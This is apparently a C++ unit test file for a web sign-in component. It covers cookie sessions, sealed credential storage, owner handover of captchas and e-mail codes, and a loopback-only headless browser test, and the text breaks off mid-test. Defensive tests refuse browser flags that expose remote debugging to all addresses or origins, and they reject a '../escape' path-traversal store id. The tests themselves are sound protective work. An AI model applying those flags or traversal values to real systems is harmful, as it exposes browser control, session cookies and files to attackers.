            ASSERT_TRUE( CWebPageScriptHelpers::FocusAndClearExpression( "#password" ).EndsWith( ")(\"#password\")" ) );
            ASSERT_TRUE( CWebPageScriptHelpers::ContainsTextExpression( "it's" ).EndsWith( ")(\"it's\")" ) );
            ASSERT_TRUE( CWebPageScriptHelpers::ValueLengthExpression( "#x" ).HasSubstr( "value.length" ) > 0 );

            // patterns, hosts and domains
            ASSERT_TRUE( CWebLoginScriptCondition::MatchesPattern( "https://shop.example.com/account?x=1", "https://shop.example.com/account*" ) );
            ASSERT_TRUE( CWebLoginScriptCondition::MatchesPattern( "abc", "*" ) && CWebLoginScriptCondition::MatchesPattern( "", "*" ) );
            ASSERT_TRUE( CWebLoginScriptCondition::MatchesPattern( "https://a.example.com/x/login", "https://*.example.com/*/login" ) );
            ASSERT_FALSE( CWebLoginScriptCondition::MatchesPattern( "https://shop.example.com/login", "https://shop.example.com/account*" ) );
            ASSERT_FALSE( CWebLoginScriptCondition::MatchesPattern( "abc", "ab" ) );
            ASSERT_TRUE( CWebLoginScript::HostOfUrl( "HTTPS://Shop.Example.com:8443/login?x" ) == "shop.example.com" );
            ASSERT_TRUE( CWebLoginScript::HostOfUrl( "http://127.0.0.1:5000" ) == "127.0.0.1" );
            ASSERT_TRUE( CWebLoginScript::HostOfUrl( "https://a@b.example.com/" ).IsNULLOrEmpty() );
            ASSERT_TRUE( CWebLoginScript::HostOfUrl( "ftp://example.com/" ).IsNULLOrEmpty() );
            ASSERT_TRUE( CWebLoginScript::HostOfUrl( "https://[::1]/" ).IsNULLOrEmpty() );
            CWebLoginScript script;
            script.cookieDomains.push_back( "example.com" );
            script.allowedHosts.push_back( "login.other.test" );
            ASSERT_TRUE( script.IsUrlAllowed( "https://shop.example.com/" ) && script.IsUrlAllowed( "https://example.com/" ) );
            ASSERT_TRUE( script.IsUrlAllowed( "https://login.other.test/x" ) );
            ASSERT_FALSE( script.IsUrlAllowed( "https://badexample.com/" ) );
            ASSERT_FALSE( script.IsUrlAllowed( "https://other.test/" ) );
            ASSERT_TRUE( script.IsStoreCookieDomain( ".example.com" ) && script.IsStoreCookieDomain( "www.example.com" ) );
            ASSERT_FALSE( script.IsStoreCookieDomain( "login.other.test" ) );
            ASSERT_FALSE( CWebSignInBrowserSettings::IsArgumentAllowed( "--remote-debugging-address=0.0.0.0" ) );
            ASSERT_FALSE( CWebSignInBrowserSettings::IsArgumentAllowed( "--user-data-dir=/home" ) );
            ASSERT_FALSE( CWebSignInBrowserSettings::IsArgumentAllowed( "--remote-allow-origins=*" ) );
            ASSERT_TRUE( CWebSignInBrowserSettings::IsArgumentAllowed( "--disable-sync" ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END
}

/*-------------------------------------------------------------------------*/

static void
PerformSessionTests( AUTH::ICredentialStore& store, const CORE::CString& storeFolder, bool storeIsSealedFile )
{
    GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.Session" );

    GUCEF_TESTFW_TESTCASE( "Test: A session is one secret, goes into a cookie jar and never shows a cookie value" )
        try
        {
            CWebSession session;
            session.storeId = StoreId;
            session.capturedAtUtcInMs = CWebSession::NowUtcInMs();
            CWebSessionCookie cookie;
            cookie.name = "sid";
            cookie.value.Set( "cookieSecretValue42" );
            cookie.domain = "127.0.0.1";
            cookie.path = "/";
            cookie.httpOnly = true;
            session.cookies.push_back( cookie );
            cookie.name = "prefs";
            cookie.value.Set( "lightTheme" );
            cookie.domain = ".example.com";
            cookie.session = false;
            cookie.expires = (Float64) ( CWebSession::NowUtcInMs() / 1000 ) + 3600.0;
            session.cookies.push_back( cookie );
            cookie.name = "old";
            cookie.expires = 1000.0;
            session.cookies.push_back( cookie );

            AUTH::CSecretString secret;
            ASSERT_TRUE( session.ToSecret( secret ) );
            CWebSession again;
            ASSERT_TRUE( again.FromSecret( secret ) );
            ASSERT_TRUE( again.storeId == StoreId && 2 == again.GetCookieCount() );     // the expired one is dropped
            ASSERT_TRUE( again.HasCookie( "sid" ) && again.HasCookie( "prefs" ) && !again.HasCookie( "old" ) );

            // the description and a log stream show no value
            ASSERT_TRUE( session.Describe().HasSubstr( "cookieSecretValue42" ) < 0 );
            CORE::CVariantStream stream;
            stream << session;
            ASSERT_TRUE( stream.ToString().HasSubstr( "cookieSecretValue42" ) < 0 && stream.ToString().HasSubstr( "3 cookies" ) >= 0 );

            // into a jar: the request of the store gets them
            WEB::CHttpCookieJar jar;
            ASSERT_TRUE( 2 == again.ApplyTo( jar ) );
            ASSERT_TRUE( jar.GetCookieHeaderValue( "127.0.0.1", "/api", false ).HasSubstr( "sid=cookieSecretValue42" ) >= 0 );
            ASSERT_TRUE( jar.GetCookieHeaderValue( "www.example.com", "/", false ).HasSubstr( "prefs=lightTheme" ) >= 0 );
            ASSERT_TRUE( jar.GetCookieHeaderValue( "other.test", "/", false ).IsNULLOrEmpty() );

            // kept in the credential store, sealed there
            ASSERT_TRUE( session.SaveTo( store ) );
            CWebSession loaded;
            ASSERT_TRUE( loaded.LoadFrom( store, StoreId ) );
            ASSERT_TRUE( 2 == loaded.GetCookieCount() && loaded.HasCookie( "sid" ) );
            ASSERT_FALSE( loaded.LoadFrom( store, "otherstore" ) );
            if ( storeIsSealedFile )
                ASSERT_FALSE( FolderHolds( storeFolder, "cookieSecretValue42" ) );
            ASSERT_TRUE( CWebSession::RemoveFrom( store, StoreId ) );
            ASSERT_FALSE( loaded.LoadFrom( store, StoreId ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Credentials are kept per slot in the credential store, sealed" )
        try
        {
            CWebSignInCredentials credentials = MakeCredentials( TestPassword );
            ASSERT_TRUE( 2 == credentials.GetCount() && credentials.Has( "password" ) && !credentials.Has( "otp" ) );
            ASSERT_TRUE( credentials.SaveTo( store, StoreId ) );

            CORE::CString::StringVector slots;
            slots.push_back( "username" );
            slots.push_back( "password" );
            ASSERT_TRUE( CWebSignInCredentials::HasSaved( store, StoreId, slots ) );
            CWebSignInCredentials loaded;
            ASSERT_TRUE( loaded.LoadFrom( store, StoreId, slots ) );
            AUTH::CSecretString value;
            ASSERT_TRUE( loaded.Get( "password", value ) && value.Reveal() == TestPassword );
            ASSERT_TRUE( loaded.HasAll( slots ) );
            if ( storeIsSealedFile )
            {
                ASSERT_FALSE( FolderHolds( storeFolder, TestPassword ) );
                ASSERT_FALSE( FolderHolds( storeFolder, TestEmail ) );
            }
            ASSERT_TRUE( CWebSignInCredentials::RemoveFrom( store, StoreId, slots ) );
            ASSERT_FALSE( CWebSignInCredentials::HasSaved( store, StoreId, slots ) );
            loaded.Clear();
            ASSERT_TRUE( 0 == loaded.GetCount() );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: The default check of an ended session: status codes and a redirect to the login page" )
        try
        {
            CWebSessionEndedCheck check;
            WEB::CHttpResponseData response;
            response.statusCode = 401;
            ASSERT_TRUE( check.IsSessionEnded( response ) );
            response.statusCode = 200;
            ASSERT_FALSE( check.IsSessionEnded( response ) );

            CWebLoginScript script;
            script.sessionEndedStatusCodes.push_back( 403 );
            script.sessionEndedRedirectPattern = "https://shop.example.com/login*";
            check.Configure( script );
            response.statusCode = 401;
            ASSERT_FALSE( check.IsSessionEnded( response ) );
            response.statusCode = 403;
            ASSERT_TRUE( check.IsSessionEnded( response ) );
            response.statusCode = 302;
            response.location = "https://shop.example.com/login?next=/library";
            ASSERT_TRUE( check.IsSessionEnded( response ) );
            response.location = "https://cdn.example.com/file.zip";
            ASSERT_FALSE( check.IsSessionEnded( response ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END
}

/*-------------------------------------------------------------------------*/

static void
PerformFakeSiteTests( CFakeLoginSite& site, AUTH::ICredentialStore& store, const CORE::CString& storeFolder, bool storeIsSealedFile )
{
    GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.FakeSite" );

    const CWebSessionSignInSettings settings = MakeSettings( site );

    GUCEF_TESTFW_TESTCASE( "Test: Automatic sign in with saved credentials captures the session of the store's domains" )
        try
        {
            site.SetAccount( TestEmail, TestPassword );
            site.SetChallenge( false );
            site.SetEmailCode( CORE::CString::Empty );
            const CFakeLoginSiteStats before = site.GetStats();

            CFakeSignInBrowser browser;
            WEB::CHttpCookie foreign;
            foreign.name = "tracker";
            foreign.value = "foreignValue";
            foreign.domain = "tracker.test";
            foreign.path = "/";
            browser.AddCookie( foreign );

            CWebSessionSignIn signIn;
            CSignInRecorder recorder;
            Record( recorder, signIn );
            ASSERT_TRUE( signIn.SetSettings( settings ) );
            signIn.SetBrowser( &browser );
            signIn.SetCredentialStore( &store );
            signIn.SetSessionStore( &store );
            ASSERT_FALSE( signIn.HasCredentials() );
            ASSERT_TRUE( signIn.SaveCredentials( MakeCredentials( TestPassword ) ) );
            ASSERT_TRUE( signIn.HasCredentials() );
            if ( storeIsSealedFile )
                ASSERT_FALSE( FolderHolds( storeFolder, TestPassword ) );

            CORE::CString message;
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
            ASSERT_TRUE( signIn.HasSession() );
            CWebSession session;
            ASSERT_TRUE( signIn.GetSession( session ) );
            ASSERT_TRUE( 1 == session.GetCookieCount() && session.HasCookie( "sid" ) && !session.HasCookie( "tracker" ) );
            ASSERT_TRUE( site.GetStats().goodPasswords == before.goodPasswords + 1 );
            ASSERT_TRUE( 1 == browser.GetStartCount() && 1 == browser.GetStopCount() && 2 == browser.GetFillCount() );
            ASSERT_FALSE( browser.GetLastSettings().headless );
            ASSERT_TRUE( browser.GetLastSettings().profileDirectory == settings.browser.profileDirectory );
            ASSERT_TRUE( 1 == recorder.starting && recorder.progress >= 3 && 0 == recorder.ownerActions && 1 == recorder.signedIn && 0 == recorder.failed );
            ASSERT_FALSE( recorder.lastHandedOver );

            // the store answers with the session
            WEB::CHttpCookieJarPtr jar( GUCEF_NEW WEB::CHttpCookieJar() );
            ASSERT_TRUE( 1 == signIn.ApplySessionTo( *jar ) );
            WEB::CHttpResponseData response;
            ASSERT_TRUE( 200 == GetLibrary( site, jar, response ) );
            ASSERT_FALSE( signIn.CheckResponse( response ) );

            // the session is kept sealed
            if ( storeIsSealedFile )
            {
                const CORE::CString::StringVector issued = site.GetIssuedSessionValues();
                ASSERT_FALSE( issued.empty() );
                for ( size_t i=0; i<issued.size(); ++i )
                    ASSERT_FALSE( FolderHolds( storeFolder, issued[ i ] ) );
            }
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: A saved session is used again without a sign in" )
        try
        {
            const CFakeLoginSiteStats before = site.GetStats();
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            signIn.SetBrowser( &browser );
            signIn.SetSessionStore( &store );
            ASSERT_FALSE( signIn.HasSession() );
            ASSERT_TRUE( signIn.LoadSavedSession() );
            ASSERT_TRUE( signIn.HasSession() );

            WEB::CHttpCookieJarPtr jar( GUCEF_NEW WEB::CHttpCookieJar() );
            ASSERT_TRUE( 1 == signIn.ApplySessionTo( *jar ) );
            WEB::CHttpResponseData response;
            ASSERT_TRUE( 200 == GetLibrary( site, jar, response ) );
            ASSERT_TRUE( 0 == browser.GetStartCount() );
            ASSERT_TRUE( site.GetStats().loginPosts == before.loginPosts && site.GetStats().sessionsIssued == before.sessionsIssued );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: An ended session is detected and signed in again without the owner" )
        try
        {
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            CSignInRecorder recorder;
            Record( recorder, signIn );
            signIn.SetBrowser( &browser );
            signIn.SetCredentialStore( &store );
            signIn.SetSessionStore( &store );
            ASSERT_TRUE( signIn.LoadSavedSession() );
            CWebSession oldSession;
            signIn.GetSession( oldSession );

            site.ExpireSessions();
            WEB::CHttpCookieJarPtr jar( GUCEF_NEW WEB::CHttpCookieJar() );
            signIn.ApplySessionTo( *jar );
            WEB::CHttpResponseData response;
            ASSERT_TRUE( 401 == GetLibrary( site, jar, response ) );
            ASSERT_TRUE( signIn.CheckResponse( response ) );
            ASSERT_FALSE( signIn.HasSession() );
            ASSERT_TRUE( 1 == recorder.ended );
            ASSERT_FALSE( signIn.LoadSavedSession() );          // forgotten in the store as well

            const UInt32 issuedBefore = site.GetStats().sessionsIssued;
            CORE::CString message;
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == signIn.RenewSession( &message ) );
            ASSERT_TRUE( browser.GetLastSettings().headless );     // unattended: no window
            ASSERT_TRUE( 1 == browser.GetClearCookiesCount() );   // the ended session is not taken from the profile again
            ASSERT_TRUE( site.GetStats().sessionsIssued == issuedBefore + 1 );
            CWebSession newSession;
            ASSERT_TRUE( signIn.GetSession( newSession ) && newSession.HasCookie( "sid" ) );

            jar->Clear();
            signIn.ApplySessionTo( *jar );
            ASSERT_TRUE( 200 == GetLibrary( site, jar, response ) );
            ASSERT_FALSE( signIn.CheckResponse( response ) );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: A captcha is handed over to the owner and the sign in goes on when it is solved" )
        try
        {
            site.SetChallenge( true );
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            CSignInRecorder recorder;
            Record( recorder, signIn );
            signIn.SetBrowser( &browser );
            signIn.SetCredentials( MakeCredentials( TestPassword ) );
            recorder.ActAsPerson( &browser );
            recorder.Fill( "#answer", "person" );
            recorder.ClickOn( "#solve" );

            CORE::CString message;
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
            ASSERT_TRUE( 1 == recorder.ownerActions && recorder.lastKind == "captcha" );
            ASSERT_TRUE( recorder.lastPrompt == "Solve the puzzle in the browser window" );
            ASSERT_TRUE( recorder.lastHandedOver && 1 == recorder.signedIn );
            ASSERT_TRUE( signIn.HasSession() );
            site.SetChallenge( false );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: An e-mail code is handed over, asynchronously, while the caller's thread stays free" )
        try
        {
            site.SetEmailCode( TestEmailCode );
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            CSignInRecorder recorder;
            Record( recorder, signIn );
            signIn.SetBrowser( &browser );
            signIn.SetCredentials( MakeCredentials( TestPassword ) );
            recorder.ActAsPerson( &browser );
            recorder.Fill( "#code", TestEmailCode );
            recorder.ClickOn( "#verify" );

            CORE::CFutureResult future = signIn.SignInAsync( WEBSIGNIN_MODE_INTERACTIVE );
            ASSERT_TRUE( 1 == recorder.starting );                  // the notice comes before the browser starts
            CORE::CFutureResult second = signIn.SignInAsync( WEBSIGNIN_MODE_INTERACTIVE );
            ASSERT_TRUE( WaitForFuture( second, 5000 ) );
            ASSERT_TRUE( ASSETSTORE_STATUS_ALREADY_EXISTS == CIAssetStoreProvider::GetStatusOfFuture( second ) );

            CWebSignInResult result;
            ASSERT_TRUE( GetFutureResult( future, result, 30000 ) );
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == result.status && result.handedOver && result.storeId == StoreId );
            ASSERT_TRUE( 2 == result.cookieCount );                 // the session and the cookie of the pending sign in
            CWebSession session;
            ASSERT_TRUE( signIn.GetSession( session ) && session.HasCookie( "sid" ) );
            PumpFor( 50 );
            ASSERT_TRUE( 1 == recorder.ownerActions && recorder.lastKind == "code" );
            ASSERT_TRUE( 1 == recorder.signedIn );
            ASSERT_FALSE( signIn.IsSignInRunning() );
            site.SetEmailCode( CORE::CString::Empty );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Unattended, a step of a person ends the sign in; without credentials it does not start" )
        try
        {
            site.SetChallenge( true );
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            CSignInRecorder recorder;
            Record( recorder, signIn );
            signIn.SetBrowser( &browser );

            CORE::CString message;
            ASSERT_TRUE( ASSETSTORE_STATUS_NOT_SIGNED_IN == signIn.SignIn( WEBSIGNIN_MODE_UNATTENDED, &message ) );
            ASSERT_TRUE( 0 == browser.GetStartCount() );
            ASSERT_TRUE( ASSETSTORE_STATUS_NOT_SIGNED_IN == signIn.RenewSession( &message ) );
            ASSERT_TRUE( message.HasSubstr( "sign in again" ) >= 0 );

            signIn.SetCredentials( MakeCredentials( TestPassword ) );
            ASSERT_TRUE( ASSETSTORE_STATUS_OWNER_ACTION_NEEDED == signIn.SignIn( WEBSIGNIN_MODE_UNATTENDED, &message ) );
            ASSERT_TRUE( message.HasSubstr( "Solve the puzzle" ) >= 0 );
            ASSERT_TRUE( 0 == recorder.ownerActions && 1 == browser.GetStopCount() );
            ASSERT_TRUE( browser.GetLastSettings().headless );
            ASSERT_FALSE( signIn.HasSession() );
            ASSERT_TRUE( ASSETSTORE_STATUS_OWNER_ACTION_NEEDED == recorder.lastStatus );
            site.SetChallenge( false );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Without credentials the owner signs in in the window" )
        try
        {
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            CSignInRecorder recorder;
            Record( recorder, signIn );
            signIn.SetBrowser( &browser );
            recorder.ActAsPerson( &browser );
            recorder.Fill( "#email", TestEmail );
            recorder.Fill( "#password", TestPassword );
            recorder.ClickOn( "#sign-in" );

            ASSERT_TRUE( ASSETSTORE_STATUS_OK == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE ) );
            ASSERT_TRUE( 1 == recorder.ownerActions && recorder.lastKind == "signIn" );
            ASSERT_TRUE( 0 == browser.GetFillCount() );
            ASSERT_TRUE( signIn.HasSession() );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: A refused password ends the sign in with the reason of the script" )
        try
        {
            const CFakeLoginSiteStats before = site.GetStats();
            CFakeSignInBrowser browser;
            CWebSessionSignIn signIn( settings );
            signIn.SetBrowser( &browser );
            signIn.SetCredentials( MakeCredentials( "not the password" ) );
            CORE::CString message;
            ASSERT_TRUE( ASSETSTORE_STATUS_NOT_SIGNED_IN == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
            ASSERT_TRUE( message == "The site refused the e-mail address or password" );
            ASSERT_TRUE( site.GetStats().wrongPasswords == before.wrongPasswords + 1 );
            ASSERT_FALSE( signIn.HasSession() );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: Cancel, a closed window and the time limit end a sign in that waits for the owner" )
        try
        {
            CORE::CString message;
            {
                // cancel from another thread while the sign in runs as a task
                CFakeSignInBrowser browser;
                CWebSessionSignIn signIn( settings );
                CSignInRecorder recorder;
                Record( recorder, signIn );
                signIn.SetBrowser( &browser );
                recorder.CancelOnOwnerAction( &signIn );
                CORE::CFutureResult future = signIn.SignInAsync( WEBSIGNIN_MODE_INTERACTIVE );
                ASSERT_TRUE( WaitForFuture( future, 30000 ) );
                ASSERT_TRUE( ASSETSTORE_STATUS_CANCELLED == CIAssetStoreProvider::GetStatusOfFuture( future ) );
                PumpFor( 50 );
                ASSERT_TRUE( 1 == recorder.ownerActions && 1 == recorder.failed && ASSETSTORE_STATUS_CANCELLED == recorder.lastStatus );
                ASSERT_TRUE( 1 == browser.GetStopCount() );
                ASSERT_FALSE( signIn.HasSession() );
            }
            {
                CFakeSignInBrowser browser;
                CWebSessionSignIn signIn( settings );
                CSignInRecorder recorder;
                Record( recorder, signIn );
                signIn.SetBrowser( &browser );
                recorder.CloseWindowOnOwnerAction( &browser );
                ASSERT_TRUE( ASSETSTORE_STATUS_CANCELLED == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
                ASSERT_TRUE( message == "The browser window was closed" );
            }
            {
                CWebSessionSignInSettings shortSettings = settings;
                shortSettings.handOverTimeoutInMs = 300;
                CFakeSignInBrowser browser;
                CWebSessionSignIn signIn( shortSettings );
                signIn.SetBrowser( &browser );
                ASSERT_TRUE( ASSETSTORE_STATUS_TIMED_OUT == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
                ASSERT_TRUE( message.HasSubstr( "in time" ) >= 0 );
                ASSERT_TRUE( 1 == browser.GetStopCount() );
            }
            {
                CWebSessionSignInSettings shortSettings = settings;
                shortSettings.signInTimeoutInMs = 300;
                CFakeSignInBrowser browser;
                CWebSessionSignIn signIn( shortSettings );
                signIn.SetBrowser( &browser );
                ASSERT_TRUE( ASSETSTORE_STATUS_TIMED_OUT == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
            }
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: No browser, and a credential that would be typed on another host, stop the sign in" )
        try
        {
            CORE::CString message;
            {
                CFakeSignInBrowser browser;
                browser.SetFailStart( true );
                CWebSessionSignIn signIn( settings );
                signIn.SetBrowser( &browser );
                ASSERT_TRUE( ASSETSTORE_STATUS_BROWSER_UNAVAILABLE == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
            }
            {
                // the real browser with a path that is not there: nothing is started
                CWebSessionSignInSettings missing = settings;
                missing.browser.executablePath = TestDirectory( "no-such-browser" );
                CWebSessionSignIn signIn( missing );
                ASSERT_TRUE( ASSETSTORE_STATUS_BROWSER_UNAVAILABLE == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
                ASSERT_TRUE( message.HasSubstr( "does not exist" ) >= 0 );
            }
            {
                // the start page sends the browser on to "localhost": not a domain of the store, so nothing is typed there
                CWebSessionSignInSettings elsewhere = settings;
                elsewhere.script.startUrl = site.GetBaseUrl() + "/elsewhere";
                CFakeSignInBrowser browser;
                CWebSessionSignIn signIn( elsewhere );
                signIn.SetBrowser( &browser );
                signIn.SetCredentials( MakeCredentials( TestPassword ) );
                ASSERT_TRUE( ASSETSTORE_STATUS_FAILED == signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message ) );
                ASSERT_TRUE( message.HasSubstr( "localhost" ) >= 0 );
                ASSERT_TRUE( 0 == browser.GetFillCount() );
            }
            {
                // settings that are not valid are refused before anything starts
                CWebSessionSignInSettings invalid = settings;
                invalid.storeId = "../escape";
                CWebSessionSignIn signIn;
                CORE::CString::StringVector problems;
                ASSERT_FALSE( signIn.SetSettings( invalid, &problems ) );
                ASSERT_TRUE( ProblemsMention( problems, "store id" ) );
            }
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END

    GUCEF_TESTFW_TESTCASE( "Test: The provider base class: sign in kind, cookies on requests, renewal and sign out" )
        try
        {
            CFakeStoreProvider plainProvider;
            ASSERT_TRUE( ASSETSTORE_SIGNIN_NONE == plainProvider.GetSignInKind() && GUCEF_NULL == plainProvider.GetWebSessionSignIn() );

            CTestWebStoreProvider provider( site );
            CWebSessionSignInSettings providerSettings = settings;
            providerSettings.storeId.Clear();
            CAssetStoreGlobal::Instance()->SetWebSignInStores( &store, &store );     // the stores the application set
            ASSERT_TRUE( provider.ConfigureWebSignIn( providerSettings, GUCEF_NULL, GUCEF_NULL ) );
            CAssetStoreGlobal::Instance()->SetWebSignInStores( GUCEF_NULL, GUCEF_NULL );
            ASSERT_TRUE( ASSETSTORE_SIGNIN_WEB_SESSION == provider.GetSignInKind() );
            ASSERT_TRUE( GUCEF_NULL != provider.GetWebSessionSignIn() && provider.GetWebSessionSignIn()->GetStoreId() == StoreId );
            ASSERT_TRUE( CORE::CString( "webSession" ) == AssetStoreSignInKindToString( provider.GetSignInKind() ) );

            CFakeSignInBrowser browser;
            provider.GetWebSessionSignIn()->SetBrowser( &browser );
            if ( !provider.IsSignedIn() )
                ASSERT_TRUE( ASSETSTORE_STATUS_OK == provider.GetWebSessionSignIn()->SignIn( WEBSIGNIN_MODE_INTERACTIVE ) );
            PumpFor( 20 );
            provider.RefreshCookieJar();
            ASSERT_TRUE( provider.IsSignedIn() );

            CAssetStoreLibraryPage page;
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == provider.QueryLibrary( CAssetStoreQuery(), page ) );
            ASSERT_TRUE( 1 == page.items.size() );

            WEB::CHttpRequestData request;
            request.SetUrl( site.GetBaseUrl() + "/files/pack-1.zip" );
            CAssetStoreTransfer transfer;
            ASSERT_TRUE( provider.AuthorizeTransferRequest( transfer, request ) );
            ASSERT_TRUE( request.otherHeaders[ "Cookie" ].HasSubstr( "sid=" ) == 0 );

            // the session ends, the download manager asks for a renewal
            site.ExpireSessions();
            page = CAssetStoreLibraryPage();
            ASSERT_TRUE( ASSETSTORE_STATUS_SESSION_EXPIRED == provider.QueryLibrary( CAssetStoreQuery(), page ) );
            ASSERT_FALSE( provider.IsSignedIn() );
            ASSERT_TRUE( provider.RenewSession() );
            ASSERT_TRUE( provider.IsSignedIn() );
            page = CAssetStoreLibraryPage();
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == provider.QueryLibrary( CAssetStoreQuery(), page ) );

            ASSERT_TRUE( provider.SignOut() );
            ASSERT_FALSE( provider.IsSignedIn() );
            WEB::CHttpRequestData afterSignOut;
            afterSignOut.SetUrl( site.GetBaseUrl() + "/files/pack-1.zip" );
            ASSERT_FALSE( provider.AddSessionCookies( afterSignOut ) );
            provider.GetWebSessionSignIn()->ForgetCredentials();
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END
}

/*-------------------------------------------------------------------------*/

static void
PerformRealBrowserTests( CFakeLoginSite& site )
{
    GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.RealBrowser" );

    GUCEF_TESTFW_TESTCASE( "Test: A real browser, headless and on the loopback only, signs in to the fake site and hands over a challenge" )
        CORE::CString executable;
        GUCEF_TESTFW_SKIP_IF( GUCEF_TESTFW_GETENV( "GUCEF_TEST_BROWSER" ) != "1", "set GUCEF_TEST_BROWSER=1 to sign in with a real browser" );
        GUCEF_TESTFW_SKIP_IF( !CChromeBrowserLocator::FindBrowser( CORE::CString::Empty, executable ), "no Chrome, Chromium, Edge or Brave on this computer" );
        try
        {
            GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "WebSignIn test: signing in with " << executable << " without a window" );
            site.SetAccount( TestEmail, TestPassword );
            site.SetChallenge( false );
            site.SetEmailCode( CORE::CString::Empty );

            const CORE::CString profile = TestDirectory( "websignin-chrome-profile" );
            if ( CORE::DirExists( profile ) )
                CORE::DeleteDir( profile, true );

            CWebSessionSignInSettings settings = MakeSettings( site );
            settings.browser.profileDirectory = profile;
            settings.browser.headless = true;
            settings.browser.startTimeoutInMs = 60000;
            settings.signInTimeoutInMs = 90000;
            settings.handOverTimeoutInMs = 30000;
            settings.pollIntervalInMs = 100;
            settings.script.stepTimeoutInMs = 15000;
            // nothing but the loopback: every other address goes to a port where nothing listens, no name resolves
            settings.browser.extraArguments.push_back( "--proxy-server=http://127.0.0.1:9" );
            settings.browser.extraArguments.push_back( "--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1" );
            settings.browser.extraArguments.push_back( "--disable-background-networking" );
            settings.browser.extraArguments.push_back( "--disable-component-update" );
            settings.browser.extraArguments.push_back( "--disable-sync" );
            settings.browser.extraArguments.push_back( "--disable-default-apps" );
            settings.browser.extraArguments.push_back( "--disable-extensions" );
            settings.browser.extraArguments.push_back( "--no-pings" );
            settings.browser.extraArguments.push_back( "--metrics-recording-only" );
            settings.browser.extraArguments.push_back( "--disable-features=OptimizationHints,MediaRouter,Translate,AutofillServerCommunication" );
            settings.browser.extraArguments.push_back( "--remote-debugging-address=0.0.0.0" );     // refused: the port stays on the loopback

            AUTH::CMemoryCredentialStore store;
            CWebSessionSignIn signIn( settings );
            CSignInRecorder recorder;
            Record( recorder, signIn );
            signIn.SetSessionStore( &store );
            signIn.SetCredentials( MakeCredentials( TestPassword ) );

            CORE::CString message;
            const TAssetStoreStatus status = signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message );
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == status );
            if ( ASSETSTORE_STATUS_OK != status )
                GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "WebSignIn test: the real browser sign in ended with " << AssetStoreStatusToString( status ) << ": " << message );
            ASSERT_TRUE( recorder.startingHeadless );
            CWebSession session;
            ASSERT_TRUE( signIn.GetSession( session ) && session.HasCookie( "sid" ) );
            WEB::CHttpCookieJarPtr jar( GUCEF_NEW WEB::CHttpCookieJar() );
            signIn.ApplySessionTo( *jar );
            WEB::CHttpResponseData response;
            ASSERT_TRUE( 200 == GetLibrary( site, jar, response ) );

            // the session ends; the next sign in clears the profile's cookies, meets the challenge and hands it over
            site.ExpireSessions();
            ASSERT_TRUE( 401 == GetLibrary( site, jar, response ) );
            ASSERT_TRUE( signIn.CheckResponse( response ) );
            site.SetChallenge( true );
            recorder.ApproveOnOwnerAction( &site );
            const UInt32 passwordsBefore = site.GetStats().goodPasswords;
